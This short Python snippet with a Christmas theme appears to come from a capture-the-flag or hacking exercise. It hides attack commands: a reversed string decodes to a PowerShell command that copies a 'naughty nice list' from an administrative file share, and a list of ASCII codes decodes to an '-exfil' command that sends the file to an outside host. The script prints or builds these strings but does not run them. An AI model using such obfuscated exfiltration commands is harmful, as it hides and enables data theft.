rev_str = r"txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop"
print(rev_str[::-1])

import subprocess

# Create a list of decimal values representing ASCII characters
ascii_values = [
    100,
    111,
    119,
    110,
    119,
    105,
    116,
    104,
    115,
    97,
    110,
    116,
    97,
    46,
    101,
    120,
    101,
    32,
    45,
    101,
    120,
    102,
    105,
    108,
    32,
    67,
    58,
    92,
    92,
    68,
    101,
    115,
    107,
    116,
    111,
    112,
    92,
    92,
    78,
    97,
    117,
    103,
    104,
    116,
    78,
    105,
    99,
    101,
    76,
    105,
    115,
    116,
    46,
    100,
    111,
    99,
    120,
    32,
    92,
    92,
    103,
    105,
    102,
    116,
    98,
    111,
    120,
    46,
    99,
    111,
    109,
    92,
    102,
    105,
    108,
    101,
]

# Convert decimal values to characters
file_path = "".join(chr(value) for value in ascii_values)

